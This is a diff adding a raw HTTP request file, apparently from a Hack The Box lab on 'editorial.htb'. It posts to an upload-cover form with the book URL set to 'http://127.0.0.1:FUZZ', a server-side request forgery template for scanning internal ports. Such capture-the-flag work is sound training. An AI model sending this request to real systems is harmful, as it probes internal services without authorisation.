@@ -1,0 +1,16 @@
+POST /upload-cover HTTP/1.1
+Host: editorial.htb
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH6FAsTFYvlv4l1kv
+
+------WebKitFormBoundaryH6FAsTFYvlv4l1kv
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:FUZZ
+------WebKitFormBoundaryH6FAsTFYvlv4l1kv
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryH6FAsTFYvlv4l1kv--
+
